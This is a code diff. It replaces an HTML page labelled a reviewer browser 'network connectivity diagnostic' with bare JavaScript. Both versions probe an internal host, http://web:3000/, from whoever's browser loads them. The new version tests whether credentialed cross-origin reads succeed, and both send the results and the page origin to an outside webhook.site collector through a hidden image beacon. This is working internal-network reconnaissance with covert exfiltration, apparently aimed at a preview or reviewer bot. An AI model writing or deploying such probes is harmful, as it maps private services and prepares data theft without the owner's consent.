@@ -1,51 +1,34 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>SitePreview Reviewer Test</title>
-</head>
-<body>
-  <h1>Reviewer Browser Test v2</h1>
-  <p>Network connectivity diagnostic</p>
+const webhook =
+  "https://webhook.site/d0fb3065-275d-4046-a057-642fdef33d40";
 
-  <script>
-    const webhook =
-      "https://webhook.site/d0fb3065-275d-4046-a057-642fdef33d40";
+function report(event, value) {
+  const params = new URLSearchParams({
+    event,
+    value: String(value),
+    time: new Date().toISOString()
+  });
 
-    function report(event, value) {
-      const params = new URLSearchParams({
-        event,
-        value: String(value),
-        time: new Date().toISOString()
-      });
+  new Image().src = webhook + "?" + params;
+}
 
-      new Image().src = webhook + "?" + params;
-    }
-
-    async function test(name, url, options = {}) {
-      try {
-        const response = await fetch(url, {
-          mode: "no-cors",
-          credentials: "omit",
-          cache: "no-store",
-          ...options
-        });
-
-        report(name, "resolved:" + response.type);
-      } catch (error) {
-        report(name, "error:" + error.name);
+async function testCors(name, credentials) {
+  try {
+    const response = await fetch(
+      "http://web:3000/robots.txt",
+      {
+        mode: "cors",
+        credentials,
+        cache: "no-store"
       }
-    }
+    );
 
-    report("started", location.origin);
+    report(name, "status:" + response.status);
+  } catch (error) {
+    report(name, "error:" + error.name);
+  }
+}
 
-    test("public-control", "https://example.com/");
+report("started", location.origin);
 
-    test("internal-http", "http://web:3000/");
-
-    test("internal-local", "http://web:3000/", {
-      targetAddressSpace: "local"
-    });
-  </script>
-</body>
-</html>
+testCors("cors-omit", "omit");
+testCors("cors-include", "include");
